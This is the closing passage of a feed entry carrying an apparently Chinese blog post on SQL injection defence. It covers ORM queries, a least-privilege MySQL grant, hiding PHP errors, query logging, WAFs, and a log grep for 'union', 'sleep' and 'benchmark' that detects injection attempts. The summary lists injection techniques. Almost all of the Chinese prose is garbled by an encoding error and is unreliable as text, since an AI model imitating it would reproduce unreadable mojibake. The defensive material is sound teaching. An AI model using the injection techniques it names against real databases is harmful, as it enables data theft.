&lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Username too long&amp;#x27;&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;ä½¿ç”¨ORMæ¡†æ¶&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight pgsql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs pgsql&#34;&gt;# Django ORM - è‡ªåŠ¨å‚æ•°åŒ–&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;User&lt;/span&gt;.objects.&lt;span class=&#34;hljs-keyword&#34;&gt;filter&lt;/span&gt;(id=user_id)&lt;br&gt;&lt;br&gt;# SQLAlchemy - å®‰å…¨æŸ¥è¯¢&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;session&lt;/span&gt;.query(&lt;span class=&#34;hljs-keyword&#34;&gt;User&lt;/span&gt;).&lt;span class=&#34;hljs-keyword&#34;&gt;filter&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;User&lt;/span&gt;.id == user_id)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;æ•°æ®åº“å±‚é¢é˜²æŠ¤&#34;&gt;&lt;a href=&#34;#æ•°æ®åº“å±‚é¢é˜²æŠ¤&#34; class=&#34;headerlink&#34; title=&#34;æ•°æ®åº“å±‚é¢é˜²æŠ¤&#34;&gt;&lt;/a&gt;æ•°æ®åº“å±‚é¢é˜²æŠ¤&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;æœ€å°æƒé™åŸåˆ™&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight pgsql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs pgsql&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;-- åˆ›å»ºä¸“ç”¨åº”ç”¨è´¦æˆ·ï¼Œä»…æˆäºˆå¿…è¦æƒé™&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;USER&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;webapp&amp;#x27;&lt;/span&gt;@&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;localhost&amp;#x27;&lt;/span&gt; IDENTIFIED &lt;span class=&#34;hljs-keyword&#34;&gt;BY&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;strong_password&amp;#x27;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;GRANT&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;SELECT&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;INSERT&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;UPDATE&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;ON&lt;/span&gt; webapp_db.* &lt;span class=&#34;hljs-keyword&#34;&gt;TO&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;webapp&amp;#x27;&lt;/span&gt;@&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;localhost&amp;#x27;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;-- ç¦æ­¢DROP, ALTER, FILEç­‰å±é™©æƒé™&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;å…³é—­é”™è¯¯ä¿¡æ¯æ˜¾ç¤º&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight scss&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs scss&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// ç”Ÿäº§ç¯å¢ƒå…³é—­é”™è¯¯æ˜¾ç¤º&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;ini_set&lt;/span&gt;(&amp;#x27;display_errors&amp;#x27;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;error_reporting&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;å¯ç”¨SQLæŸ¥è¯¢æ—¥å¿—&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs sql&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;-- MySQLå¯ç”¨æ…¢æŸ¥è¯¢æ—¥å¿—&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;SET&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;GLOBAL&lt;/span&gt; slow_query_log &lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ON&amp;#x27;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;SET&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;GLOBAL&lt;/span&gt; long_query_time &lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;WAFä¸ç›‘æ§&#34;&gt;&lt;a href=&#34;#WAFä¸ç›‘æ§&#34; class=&#34;headerlink&#34; title=&#34;WAFä¸ç›‘æ§&#34;&gt;&lt;/a&gt;WAFä¸ç›‘æ§&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;éƒ¨ç½²Webåº”ç”¨é˜²ç«å¢™&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;ModSecurityè§„åˆ™é›†&lt;/li&gt;
&lt;li&gt;äº‘WAFæœåŠ¡ï¼ˆé˜¿é‡Œäº‘ã€è…¾è®¯äº‘ç­‰ï¼‰&lt;/li&gt;
&lt;li&gt;è‡ªå®šä¹‰è¿‡æ»¤è§„åˆ™&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;å®æ—¶ç›‘æ§ä¸å‘Šè­¦&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight 1c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs 1c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# ç›‘æ§å¼‚å¸¸SQLæŸ¥è¯¢&lt;/span&gt;&lt;br&gt;tail &lt;span class=&#34;hljs-punctuation&#34;&gt;-&lt;/span&gt;f /var/&lt;span class=&#34;hljs-built_in&#34;&gt;log&lt;/span&gt;/mysql/mysql.&lt;span class=&#34;hljs-built_in&#34;&gt;log&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;| grep -i &amp;quot;&lt;/span&gt;union\&lt;span class=&#34;hljs-string&#34;&gt;|sleep\|benchmark&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;æ€»ç»“&#34;&gt;&lt;a href=&#34;#æ€»ç»“&#34; class=&#34;headerlink&#34; title=&#34;æ€»ç»“&#34;&gt;&lt;/a&gt;æ€»ç»“&lt;/h2&gt;&lt;p&gt;SQLæ³¨å…¥æ¼æ´è™½ç„¶æ˜¯ä¸€ä¸ªâ€è€â€é—®é¢˜ï¼Œä½†åœ¨å®é™…çš„æ¸—é€æµ‹è¯•å’Œå®‰å…¨è¯„ä¼°ä¸­ä»ç„¶å¤§é‡å­˜åœ¨ã€‚ç†è§£å„ç§æ³¨å…¥ç±»å‹çš„åŸç†å’Œåˆ©ç”¨æ–¹æ³•ï¼Œå¯¹äºå®‰å…¨ç ”ç©¶äººå‘˜å‘ç°æ¼æ´ã€å¼€å‘äººå‘˜ä¿®å¤æ¼æ´éƒ½å…·æœ‰é‡è¦æ„ä¹‰ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å…³é”®è¦ç‚¹å›é¡¾&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;é”™è¯¯æ³¨å…¥åˆ©ç”¨æ•°æ®åº“æŠ¥é”™è·å–ä¿¡æ¯&lt;/li&gt;
&lt;li&gt;è”åˆæ³¨å…¥é€šè¿‡unionè¯­å¥ç›´æ¥è·å–æ•°æ®&lt;/li&gt;
&lt;li&gt;æ—¶é—´ç›²æ³¨å’Œå¸ƒå°”ç›²æ³¨é€‚ç”¨äºæ— å›æ˜¾åœºæ™¯&lt;/li&gt;
&lt;li&gt;å †å æ³¨å…¥å±é™©æ€§æœ€é«˜ï¼Œå¯æ‰§è¡Œä»»æ„SQLæ“ä½œ&lt;/li&gt;
&lt;li&gt;å®½å­—èŠ‚æ³¨å…¥é’ˆå¯¹ç‰¹å®šç¼–ç ç¯å¢ƒ&lt;/li&gt;
&lt;li&gt;äºŒæ¬¡æ³¨å…¥å…·æœ‰è¾ƒå¼ºçš„éšè”½æ€§&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;é˜²æŠ¤æ ¸å¿ƒ&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢æ˜¯æœ€æœ‰æ•ˆçš„é˜²æŠ¤æ‰‹æ®µ&lt;/li&gt;
&lt;li&gt;è¾“å…¥éªŒè¯å’Œè¾“å‡ºç¼–ç åŒæ ·é‡è¦&lt;/li&gt;
&lt;li&gt;éµå¾ªæœ€å°æƒé™åŸåˆ™é…ç½®æ•°æ®åº“æƒé™&lt;/li&gt;
&lt;li&gt;å®šæœŸè¿›è¡Œå®‰å…¨è¯„ä¼°å’Œä»£ç å®¡è®¡&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å¸Œæœ›æœ¬æ–‡èƒ½å¤Ÿå¸®åŠ©è¯»è€…å…¨é¢ç†è§£SQLæ³¨å…¥çš„æ”»é˜²æŠ€æœ¯ï¼Œåœ¨å®é™…å·¥ä½œä¸­æ›´å¥½åœ°ä¿æŠ¤Webåº”ç”¨ç¨‹åºçš„å®‰å…¨ã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;å…è´£å£°æ˜&lt;/strong&gt;ï¼šæœ¬æ–‡å†…å®¹ä»…ä¾›å­¦ä¹ å’Œç ”ç©¶ä½¿ç”¨ï¼Œè¯·å‹¿ç”¨äºéæ³•ç”¨é€”ã€‚ä»»ä½•äººä½¿ç”¨æœ¬æ–‡ä¿¡æ¯è¿›è¡Œè¿æ³•æ´»åŠ¨ï¼Œåæœè‡ªè´Ÿã€‚&lt;/p&gt;
&lt;/blockquote&gt;
</content>
        <category term="æ¸—é€æµ‹è¯•" />
        <category term="Webå®‰å…¨" />
        <category term="SQLæ³¨å…¥" />
        <category term="ç½‘ç»œå®‰å…¨" />
        <updated>2025-07-23T23:51:59.000Z</updated>
    </entry>
</feed>
